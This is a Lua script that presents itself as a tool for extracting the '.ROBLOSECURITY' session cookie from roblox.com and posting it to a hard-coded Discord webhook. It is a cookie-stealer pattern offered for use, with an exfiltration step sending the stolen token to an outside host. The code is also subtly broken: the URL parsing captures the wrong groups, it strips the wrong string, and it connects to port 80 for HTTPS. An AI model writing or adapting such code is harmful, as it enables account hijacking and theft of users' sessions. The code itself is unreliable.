-- Function to create a simple HTTP GET request
function http_get(url)
    local host, path = url:match("^(https?://)([^/]+)(/.*)$")
    if not host then
        return nil, "Invalid URL"
    end

    -- Remove the protocol from the host
    host = host:sub(8) -- Remove "http://" or "https://"

    -- Create a TCP socket
    local socket = require("socket")
    local tcp = assert(socket.tcp())

    -- Connect to the server
    tcp:connect(host, 80) -- Use 443 for HTTPS, but this example does not handle SSL

    -- Send the HTTP GET request
    local request = "GET " .. path .. " HTTP/1.1\r\n" ..
                    "Host: " .. host .. "\r\n" ..
                    "Connection: close\r\n\r\n"
    tcp:send(request)

    -- Receive the response
    local response = {}
    while true do
        local line, err = tcp:receive("*l")
        if not line then break end
        table.insert(response, line)
    end

    tcp:close()

    return table.concat(response, "\n")
end

-- Function to extract a specific cookie from the response
function get_cookie(response, cookie_name)
    for line in response:gmatch("[^\r\n]+") do
        if line:find("Set-Cookie:") then
            local cookie = line:match(cookie_name .. "=([^;]+)")
            if cookie then
                return cookie
            end
        end
    end
    return nil
end

-- Function to send a message to a Discord webhook
function send_to_discord(webhook_url, message)
    local json_payload = '{"content":"' .. message .. '"}'

    -- Create a TCP socket
    local socket = require("socket")
    local tcp = assert(socket.tcp())

    -- Connect to the Discord webhook URL
    local host, path = webhook_url:match("^(https?://)([^/]+)(/.*)$")
    host = host:sub(8) -- Remove "http://" or "https://"
    path = path or "/"

    tcp:connect(host, 80) -- Use 443 for HTTPS, but this example does not handle SSL

    -- Send the HTTP POST request
    local request = "POST " .. path .. " HTTP/1.1\r\n" ..
                    "Host: " .. host .. "\r\n" ..
                    "Content-Type: application/json\r\n" ..
                    "Content-Length: " .. #json_payload .. "\r\n" ..
                    "Connection: close\r\n\r\n" ..
                    json_payload
    tcp:send(request)

    -- Receive the response
    local response = {}
    while true do
        local line, err = tcp:receive("*l")
        if not line then break end
        table.insert(response, line)
    end

    tcp:close()

    return table.concat(response, "\n")
end

-- Example usage
local url = "http://roblox.com" -- Replace with the target URL
local cookie_name = ".ROBLOSECURITY" -- Replace with the name of the cookie you want
local webhook_url = "https://discord.com/api/webhooks/1311638120458092574/O7kAiVk3uaoZECruyG6dHUzyKckQ1wo97lIYOAUdXWWU6Gh6wIKHgBIJYwmxBpG3y7dq" -- Replace with your Discord webhook URL

local response = http_get(url)
local cookie = get_cookie(response, cookie_name)

if cookie then
    send_to_discord(webhook_url, "Extracted Cookie: " .. cookie)
else
    print("Cookie not found.")
end
